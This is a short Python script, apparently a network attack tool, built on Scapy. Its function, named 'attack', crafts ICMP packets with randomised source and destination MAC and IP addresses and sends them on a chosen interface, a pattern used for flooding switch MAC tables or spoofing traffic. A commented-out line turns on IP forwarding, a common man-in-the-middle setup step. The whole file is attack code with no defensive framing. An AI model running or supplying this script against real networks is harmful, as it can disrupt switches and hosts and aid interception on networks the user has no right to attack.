from scapy.all import *
import os
def attack(iface="eth0"):
    #os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    tgthw=RandMAC("*:*:*:*:*:*")
    ethr=Ether(src=RandMAC("*:*:*:*:*:*"),dst=tgthw)
    ip=IP(src=RandIP("*.*.*.*"),dst=RandIP("*.*.*.*"))
    icmp=ICMP()
    pack=ethr/ip/icmp
    try:
        send(pack,iface=iface,loop=0)
    except:
        print("..\n")

